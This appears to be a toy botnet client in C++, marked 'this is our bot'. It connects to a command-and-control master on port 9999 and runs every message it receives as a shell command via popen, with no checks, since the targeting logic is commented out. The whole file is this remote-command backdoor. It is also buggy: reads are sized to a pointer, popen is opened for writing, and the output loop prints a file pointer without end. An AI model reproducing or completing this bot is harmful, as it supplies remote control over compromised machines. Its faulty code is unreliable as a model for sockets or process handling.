#include <iostream>
#include <errno.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdlib.h>
#include <curl/curl.h>

using namespace std;

int respond(int s, char* msg_buf){
    //writes the contents of msg_buf into socket s and return status
    
    int w = write(s, msg_buf, strlen(msg_buf));
    return w;
}

int recieve(int s, char *msg){
    //grabs messages from the channel
    int r = read(s, msg, sizeof(msg));
    if (r<0) {
      perror("Error while reading:");
      exit(1);
    }
    return 0;
}

int init_channel(char *ip, int port, char *name){
    char msg[1024];
    struct sockaddr_in server;
    server.sin_addr.s_addr = inet_addr(ip); //inet_Addr changes char to byte order'
    server.sin_family = AF_INET;
    server.sin_port = htons(port); // host to network short, host byte order to network byte order

    int channel = socket(AF_INET, SOCK_STREAM, 0);

    if(channel < 0){
        perror("Failed to initialize socket");
        exit(1);
    }
    int connection_status = connect(channel,  (struct sockaddr*) &server, sizeof(server));

    if(connection_status < 0){
        perror("Failed to connect to server");
        exit(1);
    }


    //sending message to master
    char hello[] = "YO WHAS GJUD FEM";
    for(int i=0;i<sizeof(hello); i++){
        msg[i] = hello[i];
    }
    respond(channel, msg);
    return channel;

}
int execute (int s, char *cmd) {
    FILE *f = popen(cmd, "w");

    if (!f) return -1;
    while (!feof (f)) {
        cout << f << endl;
    }
    fclose(f);
    return 0;
}
int parse(int s, char *msg, char* name){
    char *target = msg;
    //check whether the msg was targetted for this client. If no, then silently drop the packet by returning 0
    //char *cmd = strchr(msg, ':');
    //if (cmd == NULL) {
    //    printf("Incorrect formatting. Reference: TARGET: command");
    //    return -1;
    //}
    //adjust the terminated character to the end of the command
    cout << "Command sent was: " << msg << endl;

    execute (s, msg);
    return 0;

}
int main(int argc, char* argv[]) { // this is our bot
    char* name = getenv("USER");
    char msg[1024];
    int port = 9999;

    int channel = init_channel("127.0.0.1", port, name);

    while(true){
        int r = recieve(channel, msg);
        parse(channel, msg, name);
    }


}